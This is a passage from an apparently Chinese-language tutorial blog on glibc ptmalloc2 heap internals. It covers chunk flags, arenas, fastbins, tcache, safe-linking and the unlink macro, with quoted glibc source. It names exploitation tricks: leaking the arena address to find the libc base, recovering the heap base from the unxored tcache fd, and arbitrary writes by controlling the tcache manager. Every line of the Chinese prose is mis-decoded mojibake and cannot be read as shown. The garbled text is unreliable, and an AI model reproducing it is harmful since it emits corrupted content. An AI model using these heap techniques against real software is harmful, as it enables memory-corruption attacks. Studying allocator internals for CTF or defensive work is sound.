chunk from non-main arena */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunk_non_main_arena(p) ((p)-&gt;size &amp; NON_MAIN_ARENA)</span><br></code></pre></td></tr></table></figure>

<p>ä»ä½ä½åˆ°é«˜ä½ä¾æ¬¡å¦‚ä¸‹ï¼š</p>
<ul>
<li><strong>PREV_IN_USE</strong>ï¼šè¯¥chunk<strong>å†…å­˜ç‰©ç†ç›¸é‚»çš„ä¸Šä¸€ä¸ªchunk</strong>æ˜¯å¦<strong>å¤„äºè¢«åˆ†é…çŠ¶æ€</strong></li>
<li><strong>IS_MAPPED</strong>ï¼šè¯¥chunkæ˜¯å¦æ˜¯<strong>ç”±mmap</strong>()<strong>è¿›è¡Œå†…å­˜åˆ†é…å¾—åˆ°çš„</strong></li>
<li><strong>NON_MAIN_ARENA</strong>ï¼šè¯¥chunkæ˜¯å¦æ˜¯ä¸€ä¸ª<strong>ä¸å±äºmain_arenaçš„chunk</strong></li>
</ul>
<h4 id="å…³äºchunké—´çš„å†…å­˜å¤ç”¨åŠrequest2sizeè®¡ç®—ç›¸å…³äº‹é¡¹"><a href="#å…³äºchunké—´çš„å†…å­˜å¤ç”¨åŠrequest2sizeè®¡ç®—ç›¸å…³äº‹é¡¹" class="headerlink" title="å…³äºchunké—´çš„å†…å­˜å¤ç”¨åŠrequest2sizeè®¡ç®—ç›¸å…³äº‹é¡¹"></a>å…³äºchunké—´çš„å†…å­˜å¤ç”¨åŠrequest2sizeè®¡ç®—ç›¸å…³äº‹é¡¹</h4><p><del>ä¼—æ‰€å‘¨çŸ¥Â·</del>ï¼Œptmallocåœ¨ç»„ç»‡å„chunkæ—¶å…è®¸ä¸€ä¸ªchunkå¤ç”¨å…¶ç‰©ç†ç›¸é‚»çš„ä¸‹ä¸€ä¸ªchunkçš„prev_sizeå­—æ®µä½œä¸ºè‡ªå·±çš„å‚¨å­˜ç©ºé—´ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆå½“<strong>ä¸€ä¸ªchunkçš„ç‰©ç†ç›¸é‚»çš„å‰ä¸€ä¸ªchunkå¤„åœ¨è¢«åˆ†é…çŠ¶æ€æ—¶è¯¥chunkçš„prev_sizeå­—æ®µæ— æ•ˆ</strong>çš„åŸå› ï¼Œå¤§è‡´å›¾ç¤ºå¦‚ä¸‹ï¼š</p>
<p><img src="https://i.loli.net/2020/12/19/HZfcpy4wkJGg9V3.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h3 id="Top-Chunk"><a href="#Top-Chunk" class="headerlink" title="Top Chunk"></a>Top Chunk</h3><p>Top Chunk æ˜¯æ‰€æœ‰chunkä¸­è¾ƒä¸ºç‰¹æ®Šçš„ä¸€ä¸ª chunkï¼Œç”±äºç³»ç»Ÿè°ƒç”¨çš„å¼€é”€è¾ƒå¤§ï¼Œæ•…ä¸€èˆ¬æƒ…å†µä¸‹ malloc éƒ½ä¸ä¼šé¢‘ç¹åœ°ç›´æ¥è°ƒç”¨ brk ç³»ç»Ÿè°ƒç”¨å¼€è¾Ÿå †å†…å­˜ç©ºé—´ï¼Œè€Œæ˜¯ä¼šåœ¨ä¸€å¼€å§‹æ—¶å…ˆå‘ç³»ç»Ÿç”³è¯·ä¸€ä¸ªè¾ƒå¤§çš„T op Chunkï¼Œåç»­éœ€è¦å–ç”¨å†…å­˜æ—¶ä¾¿ä» Top chunk ä¸­åˆ‡å‰²ï¼Œç›´åˆ° Top chunk ä¸è¶³ä»¥åˆ†é…æ‰€éœ€å¤§å°çš„ chunk æ—¶æ‰ä¼šè¿›è¡Œç³»ç»Ÿè°ƒç”¨</p>
<h2 id="2-arena"><a href="#2-arena" class="headerlink" title="2.arena"></a>2.arena</h2><p>arenaè¿™ä¸ªè¯ç›´è¯‘æ˜¯â€œç«æŠ€åœºâ€çš„æ„æ€ï¼Œ<del>wsmè¦èµ·è¿™ç§å¥‡æ€ªçš„åå­—æˆ‘ä¹Ÿä¸çŸ¥é“ï¼Œå¯èƒ½æ˜¯å› ä¸ºå¬èµ·æ¥æ¯”è¾ƒå¸…æ°”å§</del>ï¼ŒæŒ‰ç…§ç¬”è€…çš„ç†è§£ï¼Œarena åœ¨ ptmalloc2 ä¸­ç”¨ä»¥è¡¨ç¤º<strong>ã€Œå•ä¸ªçº¿ç¨‹ç‹¬ç«‹ç»´æŠ¤çš„å†…å­˜æ± ã€</strong>ï¼Œè¿™æ˜¯ç”±äºå¤§éƒ¨åˆ†æƒ…å†µä¸‹å¯¹äºæ¯ä¸ªçº¿ç¨‹è€Œè¨€å…¶éƒ½ä¼šå•ç‹¬æœ‰ç€ä¸€ä¸ª arena å®ä¾‹ç”¨ä»¥ç®¡ç†å±äºè¯¥çº¿ç¨‹çš„å †å†…å­˜åŒºåŸŸï¼ŒåŒ…æ‹¬ Binsã€Fastbin ç­‰å…¶å®éƒ½æ˜¯è¢«æ”¾ç½®åœ¨arenaçš„ç»“æ„ä½“ä¸­ç»Ÿä¸€è¿›è¡Œç®¡ç†çš„</p>
<h3 id="main-arena"><a href="#main-arena" class="headerlink" title="main_arena"></a>main_arena</h3><p>main_arena å³**ä¸»çº¿ç¨‹æ‰€ä½¿ç”¨çš„ arena **ï¼Œä¸ºä¸€ä¸ªå®šä¹‰äº malloc.c ä¸­çš„é™æ€çš„malloc_stateç»“æ„ä½“ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* There are several instances of this struct (&quot;arenas&quot;) in this</span><br><span class="hljs-comment">   malloc.  If you are adapting this malloc in a way that does NOT use</span><br><span class="hljs-comment">   a static or mmapped malloc_state, you MUST explicitly zero-fill it</span><br><span class="hljs-comment">   before using. This malloc relies on the property that malloc_state</span><br><span class="hljs-comment">   is initialized to all zeroes (as is true of C statics).  */</span><br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> <span class="hljs-title">main_arena</span> =</span><br>&#123;<br>  .mutex = _LIBC_LOCK_INITIALIZER,<br>  .next = &amp;main_arena,<br>  .attached_threads = <span class="hljs-number">1</span><br>&#125;;<br></code></pre></td></tr></table></figure>

<p><strong>è¯¥arenaä½äºlibcä¸­</strong>ï¼Œè€Œå¹¶ä¸ä¼¼<strong>å…¶ä»–arenaä¸€èˆ¬ä½äºå †åŒº</strong></p>
<p>åœ¨å †é¢˜ä¸­é€šå¸¸é€šè¿‡æ³„éœ²arenaçš„åœ°å€ä»¥è·å¾— libc åœ¨å†…å­˜ä¸­çš„åŸºåœ°å€</p>
<h3 id="â‘ fast-bin"><a href="#â‘ fast-bin" class="headerlink" title="â‘ fast bin"></a>â‘ fast bin</h3><p>ptmalloc2 <strong>ç‹¬ç«‹äºBinsä¹‹å¤–å•ç‹¬è®¾è®¡äº†ä¸€ä¸ª Fastbin ç”¨ä»¥å‚¨å­˜ä¸€äº› size è¾ƒå°çš„é—²ç½® chunk</strong></p>
<ul>
<li>Fastbins æ˜¯ä¸€ä¸ªç”¨ä»¥ä¿å­˜æœ€è¿‘é‡Šæ”¾çš„è¾ƒå°çš„ chunk çš„æ•°ç»„ï¼Œä¸ºäº†æé«˜é€Ÿåº¦å…¶<strong>ä½¿ç”¨å•å‘é“¾è¡¨è¿›è¡Œé“¾æ¥</strong></li>
<li><strong>Fastbin é‡‡å– FILO&#x2F;LIFO çš„ç­–ç•¥ï¼Œå³æ¯æ¬¡éƒ½å–ç”¨ fastbin é“¾è¡¨å¤´éƒ¨çš„ chunk ï¼Œæ¯æ¬¡é‡Šæ”¾chunkæ—¶éƒ½æ’å…¥è‡³é“¾è¡¨å¤´éƒ¨æˆä¸ºæ–°çš„å¤´ç»“ç‚¹</strong>ï¼Œå› è€Œå¤§å¹…æé«˜äº†å­˜å–chunkçš„é€Ÿåº¦</li>
<li><strong>Fastbin ä¸­çš„ chunk æ°¸è¿œä¿æŒåœ¨ in_use çš„çŠ¶æ€ï¼Œè¿™ä¹Ÿä¿è¯äº†å¥¹ä»¬ä¸ä¼šè¢«ä¸å…¶ä»–çš„ free chunk åˆå¹¶</strong></li>
<li><strong>malloc_consolidate()å‡½æ•°å°†ä¼šæ¸…ç©º fastbin ä¸­æ‰€æœ‰çš„ chunkï¼Œåœ¨è¿›è¡Œç›¸åº”çš„åˆå¹¶åé€å…¥æ™®é€šçš„ bins ä¸­</strong></li>
<li><strong>32ä½ä¸‹æœ€å¤§çš„ fastbin chunk size ä¸º 0x40ï¼Œ 64ä½ä¸‹æœ€å¤§çš„ fastbin chunk size ä¸º 0x80ï¼Œè¶…è¿‡è¿™ä¸ªèŒƒå›´çš„ chunk åœ¨ free ä¹‹ååˆ™ä¸ä¼šè¿›å…¥ fastbin ä¸­</strong></li>
</ul>
<h4 id="å®‰å…¨æ£€æŸ¥"><a href="#å®‰å…¨æ£€æŸ¥" class="headerlink" title="å®‰å…¨æ£€æŸ¥"></a>å®‰å…¨æ£€æŸ¥</h4><h5 id="I-size"><a href="#I-size" class="headerlink" title="I.size"></a>I.size</h5><p>åœ¨ malloc() å‡½æ•°åˆ†é… fastbin size èŒƒå›´çš„ chunk æ—¶ï¼Œè‹¥æ˜¯å¯¹åº”çš„ fastbin ä¸­æœ‰ç©ºé—² chunkï¼Œåœ¨å–å‡ºå‰ä¼šæ£€æŸ¥å…¶ size åŸŸä¸å¯¹åº”ä¸‹æ ‡æ˜¯å¦ä¸€è‡´ï¼Œ<strong>ä¸ä¼šæ£€æŸ¥æ ‡å¿—ä½</strong>ï¼Œè‹¥å¦ä¾¿ä¼šè§¦å‘abort</p>
<h5 id="II-double-free"><a href="#II-double-free" class="headerlink" title="II.double free"></a>II.double free</h5><p>åœ¨ free() å‡½æ•°ä¸­ä¼šå¯¹fastbiné“¾è¡¨çš„<strong>å¤´ç»“ç‚¹</strong>è¿›è¡Œæ£€æŸ¥ï¼Œè‹¥å°†è¦è¢«æ”¾å…¥ fastbin ä¸­çš„ chunk <strong>ä¸å¯¹åº”ä¸‹æ ‡çš„é“¾è¡¨çš„å¤´ç»“ç‚¹ä¸ºåŒä¸€chunkï¼Œåˆ™ä¼šè§¦å‘abort</strong></p>
<h5 id="III-Safe-linking-æœºåˆ¶ï¼ˆonly-glibc2-32-and-upï¼‰"><a href="#III-Safe-linking-æœºåˆ¶ï¼ˆonly-glibc2-32-and-upï¼‰" class="headerlink" title="III.Safe linking æœºåˆ¶ï¼ˆonly glibc2.32 and upï¼‰"></a>III.Safe linking æœºåˆ¶ï¼ˆonly glibc2.32 and upï¼‰</h5><p>è‡ª glibc 2.32 èµ·å¼•å…¥äº† safe-linking æœºåˆ¶ï¼Œå…¶æ ¸å¿ƒæ€æƒ³æ˜¯<strong>åœ¨é“¾è¡¨ä¸Šçš„ chunk ä¸­å¹¶ä¸ç›´æ¥å­˜æ”¾å…¶æ‰€è¿æ¥çš„ä¸‹ä¸€ä¸ª chunk çš„åœ°å€ï¼Œè€Œæ˜¯å­˜æ”¾ä¸‹ä¸€ä¸ª chunk çš„åœ°å€ä¸ã€è‡ªèº«åœ°å€å³ç§» 12ä½ã€‘æ‰€å¼‚æˆ–å¾—çš„å€¼</strong>ï¼Œä½¿å¾—æ”»å‡»è€…åœ¨å¾—çŸ¥è¯¥ chunk çš„åœ°å€ä¹‹å‰æ— æ³•ç›´æ¥åˆ©ç”¨å…¶æ„é€ ä»»æ„åœ°å€å†™</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯<strong>fastbin çš„å…¥å£èŠ‚ç‚¹å­˜æ”¾çš„ä»æ˜¯æœªç»å¼‚æˆ–çš„ chunk åœ°å€</strong></p>
<h3 id="â‘¡tcacheï¼ˆonly-libc2-26-and-upï¼‰"><a href="#â‘¡tcacheï¼ˆonly-libc2-26-and-upï¼‰" class="headerlink" title="â‘¡tcacheï¼ˆonly libc2.26 and upï¼‰"></a>â‘¡tcacheï¼ˆonly libc2.26 and upï¼‰</h3><p>Thread Cache(tcache)æœºåˆ¶ç”¨ä»¥å¿«é€Ÿå­˜å–chunkï¼Œä½¿ç”¨å¦‚ä¸‹ç»“æ„ä½“è¿›è¡Œç®¡ç†ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* There is one of these for each thread, which contains the</span><br><span class="hljs-comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span><br><span class="hljs-comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span><br><span class="hljs-comment">   are redundant (we could have just counted the linked list each</span><br><span class="hljs-comment">   time), this is for performance reasons.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">uint16_t</span> counts[TCACHE_MAX_BINS];<br>  tcache_entry *entries[TCACHE_MAX_BINS];<br>&#125; tcache_perthread_struct;<br></code></pre></td></tr></table></figure>

<ul>
<li>countsï¼šç”¨ä»¥å­˜å‚¨è¯¥ tcache ä¸­æ¯ä¸ª entry ä¸­çš„ chunk çš„æ•°é‡ï¼Œ<strong>glibc2.29 åŠä¹‹å‰çš„ç‰ˆæœ¬ä¸­æ¯ä¸ª entry çš„ count éƒ½æ˜¯ char ç±»å‹ï¼Œè‡ª glibc2.30 èµ·æ”¹ä¸º uint16_t ç±»å‹</strong></li>
<li>entryï¼šç”¨ä»¥å­˜å‚¨ å­˜æ”¾åœ¨ tcache ä¸­çš„ chunk é“¾è¡¨çš„å¤´èŠ‚ç‚¹</li>
</ul>
<p>tcache ä¸­ä¸€å…±æœ‰64ä¸ª entries ï¼Œæ¯ä¸ª entries ä½¿ç”¨å¦‚ä¸‹ç»“æ„ä½“è¿›è¡Œç®¡ç†ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><br>  <span class="hljs-comment">/* This field exists to detect double frees.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span> *<span class="hljs-title">key</span>;</span><br>&#125; tcache_entry;<br></code></pre></td></tr></table></figure>

<p>å³ tcache ä¸­çš„ chunk ä¸ºä½¿ç”¨ fd åŸŸè¿æ¥çš„å•å‘é“¾è¡¨ï¼Œè‡ª glibc2.29èµ· ä½¿ç”¨ bk åŸŸä¿å­˜ tcache key</p>
<p><strong>tcache åŒæ ·é‡‡ç”¨ FIFO æœºåˆ¶å­˜å– chunkï¼Œæ¯ä¸ªé“¾æ¡ä¸Šä»…èƒ½è¿æ¥ 7 ä¸ª chunkï¼Œå½“å¯¹åº”çš„ entry æ»¡äº†ä»¥åå† free ä¸€ä¸ª chunk åˆ™ä¼šæ”¾å…¥ fastbin æˆ– unsorted bin ä¸­</strong></p>
<p>ä¸æ™®é€šçš„ bin æ‰€ä¸åŒçš„æ˜¯ï¼Œtcache ä¸­ç©ºé—² chunk çš„ fd åŸŸæŒ‡å‘çš„å¹¶éæ˜¯ä¸‹ä¸€ä¸ª chunk çš„ prev_size åŸŸï¼Œä»æ˜¯ fd åŸŸ</p>
<h4 id="å®‰å…¨ä¿æŠ¤æœºåˆ¶"><a href="#å®‰å…¨ä¿æŠ¤æœºåˆ¶" class="headerlink" title="å®‰å…¨ä¿æŠ¤æœºåˆ¶"></a>å®‰å…¨ä¿æŠ¤æœºåˆ¶</h4><p>tcache æœºåˆ¶åˆšå‡ºæ¥æ—¶åŸºæœ¬ä¸Šæ˜¯æ¯«æ— ä¿æŠ¤çš„ï¼Œå› æ­¤å¯¹äº tcache çš„åˆ©ç”¨æ¯”ä»¥å¾€è¦ç®€å•å¾—å¤šï¼ˆæ¯”å¦‚è¯´å¯ä»¥ç›´æ¥ double freeã€ä»»æ„åœ°å€å†™ç­‰</p>
<h5 id="I-tcache-keyï¼ˆonly-libc2-29-and-upï¼‰"><a href="#I-tcache-keyï¼ˆonly-libc2-29-and-upï¼‰" class="headerlink" title="I.tcache keyï¼ˆonly libc2.29 and upï¼‰"></a>I.tcache keyï¼ˆonly libc2.29 and upï¼‰</h5><p>è‡ª glibc2.29 ç‰ˆæœ¬èµ· tcache æ–°å¢äº†ä¸€ä¸ª key å­—æ®µï¼Œè¯¥å­—æ®µä½äº chunk çš„ bk å­—æ®µï¼Œ<strong>å€¼ä¸º tcache ç»“æ„ä½“çš„åœ°å€</strong>ï¼Œè‹¥ free() æ£€æµ‹åˆ° chunk-&gt;bk &#x3D;&#x3D; tcache åˆ™ä¼šéå† tcache <strong>æŸ¥æ‰¾å¯¹åº”é“¾è¡¨ä¸­æ˜¯å¦æœ‰è¯¥chunk</strong></p>
<p>æœ€æ–°ç‰ˆæœ¬çš„ä¸€äº›è€ glibc ï¼ˆå¦‚æ–°ç‰ˆ2.27ç­‰ï¼‰ä¹Ÿå¼•å…¥äº†è¯¥é˜²æŠ¤æœºåˆ¶</p>
<h5 id="II-Safe-linking-æœºåˆ¶ï¼ˆonly-glibc2-32-and-upï¼‰"><a href="#II-Safe-linking-æœºåˆ¶ï¼ˆonly-glibc2-32-and-upï¼‰" class="headerlink" title="II.Safe linking æœºåˆ¶ï¼ˆonly glibc2.32 and upï¼‰"></a>II.Safe linking æœºåˆ¶ï¼ˆonly glibc2.32 and upï¼‰</h5><p>ä¸ fastbin çš„safe-linking æœºåˆ¶ç›¸åŒï¼Œè¿™é‡Œä¾¿ä¸å†è¿‡å¤šèµ˜å™</p>
<p>ä¸è¿‡ç›¸æ¯”èµ· fastbin è€Œè¨€ï¼Œtcache çš„ safe-linking æœºåˆ¶<strong>ç»™äº†æˆ‘ä»¬æ–°çš„æ³„éœ²å †åŸºå€çš„æ–¹å¼</strong>ï¼š</p>
<p>æˆ‘ä»¬ä¸éš¾è§‚å¯Ÿåˆ°ï¼Œåœ¨ tcache çš„ä¸€ä¸ª entry ä¸­æ”¾å…¥ç¬¬ä¸€ä¸ª chunk æ—¶ï¼Œå…¶åŒæ ·ä¼šå¯¹è¯¥ entry ä¸­çš„ â€œchunkâ€ ï¼ˆNULLï¼‰è¿›è¡Œå¼‚æˆ–è¿ç®—åå†™å…¥åˆ°å°†æ”¾å…¥ tcache ä¸­çš„ chunk çš„ <code>fd</code> å­—æ®µï¼Œè‹¥æ˜¯æˆ‘ä»¬èƒ½å¤Ÿæ‰“å°è¯¥ free chunk çš„fdå­—æ®µï¼Œ<strong>ä¾¿èƒ½å¤Ÿç›´æ¥è·å¾—æœªç»å¼‚æˆ–è¿ç®—çš„å †ä¸Šç›¸å…³åœ°å€</strong></p>
<p><img src="https://i.loli.net/2021/03/28/cYVZeEbOkf17xhP.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p><img src="https://i.loli.net/2021/03/28/AQ1P4EeuXRCOyGo.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>åŒæ—¶æˆ‘ä»¬æ³¨æ„åˆ°ï¼Œåœ¨ tcache-&gt;entry ä¸­å­˜æ”¾çš„<strong>ä»æ˜¯æœªç»åŠ å¯†è¿‡çš„åœ°å€</strong>ï¼Œè‹¥æ˜¯æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶ tcache ç®¡ç†å™¨åˆ™ä»å¯ä»¥åœ¨ä¸çŸ¥é“å †ç›¸å…³åœ°å€æ—¶è¿›è¡Œä»»æ„åœ°å€å†™</p>
<h3 id="â‘¢binsæ•°ç»„"><a href="#â‘¢binsæ•°ç»„" class="headerlink" title="â‘¢binsæ•°ç»„"></a>â‘¢binsæ•°ç»„</h3><p>å³å¸¸è§„çš„å­˜æ”¾ chunk çš„æ•°ç»„ï¼Œå…¶ä¸­å­˜æ”¾çš„ chunk ä½¿ç”¨ã€åŒå‘é“¾è¡¨ã€‘è¿›è¡Œè¿æ¥</p>
<p>ä¸“é—¨æœ‰ç€ä¸€ç§å«åš <code>unlink</code> çš„æœºåˆ¶ç”¨ä»¥ä»å…¶ä¸­å–å‡º chunkï¼Œå…¶ä¸­<strong>æœ‰ç€å„ç§å„æ ·çš„å®‰å…¨æ£€æŸ¥</strong></p>
<h4 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h4><h5 id="I-unlink-under-glibc2-28-involved"><a href="#I-unlink-under-glibc2-28-involved" class="headerlink" title="I.unlink under glibc2.28(involved)"></a>I.unlink under glibc2.28(involved)</h5><p>ç”±äºä»å„ç§binsä¸­å–å‡ºä¸€ä¸ªchunkçš„æ“ä½œååˆ†é¢‘ç¹ï¼Œè‹¥æ˜¯ä½¿ç”¨å‡½æ•°å®ç°åˆ™ä¼šé€ æˆè¾ƒå¤§çš„å¼€é”€ï¼Œæ•…unlinkæ“ä½œè¢«å•ç‹¬å®ç°ä¸ºä¸€ä¸ªå®ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Take a chunk off a bin list */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span><br><span class="hljs-meta">    FD = P-&gt;fd;                                      \</span><br><span class="hljs-meta">    BK = P-&gt;bk;                                      \</span><br><span class="hljs-meta">    <span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))              \</span><br><span class="hljs-meta">      malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br><span class="hljs-meta">    <span class="hljs-keyword">else</span> &#123;                                      \</span><br><span class="hljs-meta">        FD-&gt;bk = BK;                                  \</span><br><span class="hljs-meta">        BK-&gt;fd = FD;                                  \</span><br><span class="hljs-meta">        <span class="hljs-keyword">if</span> (!in_smallbin_range (P-&gt;size)                      \</span><br><span class="hljs-meta">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;              \</span><br><span class="hljs-meta">        <span class="hljs-keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)          \</span><br><span class="hljs-meta">        || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span><br><span class="hljs-meta">          malloc_printerr (check_action,                      \</span><br><span class="hljs-meta">                   <span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span><br><span class="hljs-meta">                   P, AV);                          \</span><br><span class="hljs-meta">            <span class="hljs-keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;                      \</span><br><span class="hljs-meta">                <span class="hljs-keyword">if</span> (P-&gt;fd_nextsize == P)                      \</span><br><span class="hljs-meta">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;              \</span><br><span class="hljs-meta">                <span class="hljs-keyword">else</span> &#123;                                  \</span><br><span class="hljs-meta">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                  \</span><br><span class="hljs-meta">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                  \</span><br><span class="hljs-meta">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                  \</span><br><span class="hljs-meta">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                  \</span><br><span class="hljs-meta">                  &#125;                                  \</span><br><span class="hljs-meta">              &#125; <span class="hljs-keyword">else</span> &#123;                                  \</span><br><span class="hljs-meta">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;              \</span><br><span class="hljs-meta">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;              \</span><br><span class="hljs-meta">              &#125;                                      \</span><br><span class="hljs-meta">          &#125;                                      \</span><br><span class="hljs-meta">      &#125;                                          \</span><br><span class="hljs-meta">&#125;</span><br></code></pre></td></tr></table></figure>

<p>å¤§è‡´çš„ä¸€ä¸ªæµç¨‹å¦‚ä¸‹ï¼š</p>
<ul>
<li>Pä¸ºè¦è¢«unlinkçš„chunkï¼ŒFDã€BKåˆ™æ˜¯chunkï¼šP-&gt;fdä¸P-&gt;bk</li>
<li>æ£€æŸ¥FD-&gt;bkä¸BK-&gt;fdæ˜¯å¦éƒ½æŒ‡å‘Pï¼Œè‹¥å¦ï¼Œåˆ™è¾“å‡ºé”™è¯¯ä¿¡æ¯</li>
<li>å°†FD-&gt;bkæŒ‡å‘BKï¼Œå°†BK-&gt;fdæŒ‡å‘FDï¼Œ<strong>è¿™ä¸ªæ—¶å€™è¿™ä¸ªchunkä¾¿å·²ç»ä¸åœ¨è¯¥binçš„åŒå‘å¾ªç¯é“¾è¡¨ä¸­äº†</strong></li>
<li><strong>è‹¥æ˜¯chunk sizeä½äºsmall binçš„èŒƒå›´å†…ï¼Œåˆ™unlinkç»“æŸï¼Œå¦åˆ™æ ‡å¿—ç€æ­¤æ—¶chunkçš„fd_nextsizeä¸bk_nextsizeå­—æ®µæ˜¯å¯ç”¨çš„ï¼Œéœ€è¦æ¥ç€å°†ä¹‹ä»nextsizeé“¾è¡¨ä¸­unlink</strong>ï¼ˆlarge binç‰¹æœ‰ï¼‰</li>
<li>æ£€æŸ¥P-&gt;fd_nextsize-&gt;bk_sizeä¸P-&gt;bk_nextsize-&gt;fd_nextsizeæ˜¯å¦æŒ‡å‘Pï¼Œå’Œå‰é¢çš„è¿‡ç¨‹ç±»ä¼¼è¿™é‡Œä¾¿ä¸å†èµ˜å™</li>
<li><strong>è‹¥FD-&gt;fd_nextsizeä¸ä¸ºNULLï¼Œåˆ™å°†Pä»å…¶æ‰€å¤„nextsizeé“¾è¡¨ä¸­unlink</strong></li>
<li><strong>è‹¥FD-&gt;fd_nextsizeä¸ºNULLæ—¶</strong>ï¼Œè‹¥P-&gt;fd_nextsizeæŒ‡å‘è‡ªèº«ï¼Œåˆ™å°†FD-&gt;fd_nextsizeä¸FD-&gt;bk_nextsizeéƒ½æŒ‡å‘FDï¼ˆä»£è¡¨è¯¥chunkä¸å±äºä»»ä½•ä¸€ä¸ªnextsizeé“¾è¡¨ï¼Ÿï¼‰ï¼Œ<strong>å¦åˆ™ä½¿ç”¨FDæ›¿æ¢æ‰Pæ‰€åœ¨çš„nextsizeé“¾è¡¨ä¸­çš„ä½ç½®</strong></li>
</ul>
<p>å¤§è‡´è¿‡ç¨‹å¦‚ä¸‹å›¾æ‰€ç¤º</p>
<p><img src="https://i.loli.net/2020/12/23/AVsn1tB9hydocYe.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p><img src="https://i.loli.net/2020/12/23/MfhiGYa97XLRtHK.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p><img src="https://i.loli.net/2020/12/23/gkAXzI2M8UviO9C.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p><img src="https://i.loli.net/2020/12/23/TR23CkfSEOLYtgh.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p><img src="https://i.loli.net/2020/12/23/FGMlVisw69xtThJ.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p><img src="https://i.loli.net/2020/12/23/PNIcnpb1YJovmai.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h2 id="II-unlink-over-glibc-2-29-involved"><a href="#II-unlink-over-glibc-2-29-involved" class="headerlink" title="II.unlink over glibc 2.29(involved)"></a>II.unlink over glibc 2.29(involved)</h2><p>è‡ª glibc 2.29 èµ· unlink è¢«å®ç°ä¸ºä¸€ä¸ªå‡½æ•°ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 